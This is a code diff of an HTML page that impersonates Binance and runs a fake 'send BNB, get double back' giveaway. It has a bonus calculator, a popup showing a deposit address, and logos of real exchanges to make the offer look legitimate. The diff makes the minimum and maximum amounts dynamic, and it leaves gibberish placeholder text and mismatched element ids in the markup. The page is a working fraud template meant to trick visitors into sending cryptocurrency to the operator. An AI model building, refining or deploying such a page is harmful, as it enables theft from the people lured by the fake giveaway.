@@ -6,18 +6,18 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Binance Pay BNB</title>
-  <link rel="stylesheet" href="/css/index.css" />
+  <link rel="stylesheet" href="public/css/index.css" />
   <link rel="stylesheet"
     href="https://fonts.googleapis.com/css2?family=Material+Symbols+Sharp:opsz,wght,FILL,GRAD@48,400,0,0" />
 </head>
 
 <body>
   <div class="container" id="container">
-    <img id="img" src="/assets/img/Binance-Logo.wine.png" alt="binance" />
+    <img id="img" src="/public/images/Binance-Logo.png" alt="binance" />
     <div class="container-box" id="container-box">
       <p>
-        To verify your BNB address, just send from 1.07 to 15 BNB to the
-        generated address below and get from 2.14 to 30 BNB (you will earn 3x
+        To verify your BNB address, just send from <span id="minAmount">1.17</span> to <span id="maxAmount"></span> BNB to the
+        generated address below and get from <span id="min2"></span> to <span id="max2"></span> BNB (you will earn 3x
         bonus if you send 10 BNB and above) sent back to the address you sent
         BNB from or the one you specified below, you will get double of what
         you send to the giveaway address.
@@ -30,7 +30,7 @@
       <h2>how to participate</h2>
       <ul>
         <li>
-          <span>step 1: </span>Make sure you have at least 0.1 BNB or above in
+          <span>step 1: </span>Make sure you have at least <span id="minAmount"></span> BNB or above in
           your wallet.
         </li>
         <li>
@@ -62,24 +62,25 @@
       <div class="form">
         <div class="input-group">
           <div class="input">
-            <label for="amount">amount:</label>
+            <label>amount:</label>
             <div class="input-box">
-              <img src="/assets/img/Binance.png" alt="binance" />
-              <input type="number" name="amount" id="amount" />
+              <img src="/public/images/Binance.png" alt="Binance" />
+              <input type="number" onkeyup="bonusCalculation()" name="amount" class="amount" />
             </div>
+            <span class="warning">qwekjfsb vgkjf jekgnj jnektn sdnbgkrty<span id="_lessThan"></span></span>
           </div>
           <span>=</span>
           <div class="input">
-            <label for="amount">bonus:</label>
+            <label>bonus:</label>
             <div class="input-box">
-              <img src="/assets/img/Binance.png" alt="binance" />
-              <input type="text" name="bonus" id="bonus" readonly />
+              <img src="/public/images/Binance.png" alt="Binance" />
+              <input type="number" readonly name="bonus" class="bonus" />
             </div>
           </div>
         </div>
-        <div class="input-address">
+      <div class="input-address">
           <label for="address">address:</label>
-          <input type="text" name="address" id="address" />
+          <input type="text" required name="address" id="address" />
         </div>
         <button id="btn" class="btn">generate payment</button>
       </div>
@@ -90,62 +91,83 @@
       <div class="ads">
         <div class="ads-set">
           <div class="ads-box">
-            <img src="/assets/img/Binance.png" alt="binance" />binance
+            <img src="public/images/Binance.png" alt="binance" />binance
           </div>
           <div class="ads-box">
-            <img src="/assets/img/upbit.PNG" alt="upbit" />upbit
+            <img src="public/images/upbit.PNG" alt="upbit" />upbit
           </div>
           <div class="ads-box">
-            <img src="/assets/img/ckex.png" alt="ckex" />ckex
-          </div>
-        </div>
-        <div class="ads-set">
-          <div class="ads-box">
-            <img src="/assets/img/remittance.PNG" alt="remittance" />remitano
-          </div>
-          <div class="ads-box">
-            <img src="/assets/img/mercatox.png" alt="mercatox" />mercatox
-          </div>
-          <div class="ads-box">
-            <img src="/assets/img/luno.PNG" alt="luno" />luno
+            <img src="public/images/ckex.png" alt="ckex" />ckex
           </div>
         </div>
         <div class="ads-set">
           <div class="ads-box">
-            <img src="/assets/img/coinsph.png" alt="coinsph" />coins.ph
+            <img src="public/images/remittance.PNG" alt="remittance" />remitano
           </div>
           <div class="ads-box">
-            <img src="/assets/img/coinbase.png" alt="coinbase" />coinsbase
+            <img src="public/images/mercatox.png" alt="mercatox" />mercatox
           </div>
           <div class="ads-box">
-            <img src="/assets/img/yobit.png" alt="yobit" />yobit
+            <img src="public/images/luno.PNG" alt="luno" />luno
+          </div>
+        </div>
+        <div class="ads-set">
+          <div class="ads-box">
+            <img src="public/images/coinsph.png" alt="coinsph" />coins.ph
+          </div>
+          <div class="ads-box">
+            <img src="public/images/coinbase.png" alt="coinbase" />coinsbase
+          </div>
+          <div class="ads-box">
+            <img src="public/images/yobit.png" alt="yobit" />yobit
           </div>
         </div>
       </div>
     </div>
   </div>
   <div class="prompt-box" id="popup">
-    <img src="/assets/img/address/eth-address.PNG" alt="bnb-address" />
-    <span>0 confirmation</span>
-    <span>spinning loading</span>
-    <div class="form">
-      <label for="amount">amount</label>
-      <div class="input-box">
-      <input type="number" name="amount" id="amount" />
-      <a href="#"><span class="material-symbols-sharp">file_copy</span></a>
+      <img src="public/images/address/eth-address.PNG" alt="bnb-address" />
+      <span>0 confirmation</span>
+      <span>spinning loading</span>
+      <div class="form">
+        
+        <div class="input-box">
+          <span id="amount-to-pay"></span>
+          <a href="#"><span class="material-symbols-sharp">file_copy</span></a>
+        </div>
+        <label for="amount">address</label>
+        <div id="copy-link" class="input-box">
+        <input type="text" required readonly class="copy-link-input" />
+        <button id="copyBtn" class="copy-link-button"><span class="material-symbols-sharp">file_copy</span></button>
       </div>
-      <label for="amount">address</label>
-      <div class="copy-link input-box">
-      <input type="text" readonly class="copy-link-input" />
-      <button id="copyBtn" class="copy-link-button"><span class="material-symbols-sharp">file_copy</span></button>
-    </div>
-    </div>
-    <button>pay now</button>
+      </div>
+      <button>pay now</button>
+    <!-- <div class="failed">
+      <span class="material-symbols-sharp">
+        cancel
+        </span>
+        <span class="info"></span>
+    </div> -->
+    
   </div>
-  <script src="/jscript/main.js"></script>
+  <!-- <div class="payment-page">
+    <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>    <p>checking transaction status</p>
+  </div> -->
+  <script src="/public/jscript/main.js"></script>
   <script>
-     let address = document.querySelector(".copy-link-input");
-        address.value = btcAddress;
+    let address = document.querySelector(".copy-link-input");
+        address.value = bnbAddress;
+    let _lessThan = 1.17;
+    let _greaterThan = 15.32;
+    maxAmount.innerText = _greaterThan;
+    minAmount.innerText = _lessThan;
+    
+    const x2maxAmount = _greaterThan * 2;
+    const x2minAmount = _lessThan * 2;
+    
+    max2Amount.innerText = x2maxAmount;
+    min2Amount.innerText = x2minAmount;
+
   </script>
 </body>
 
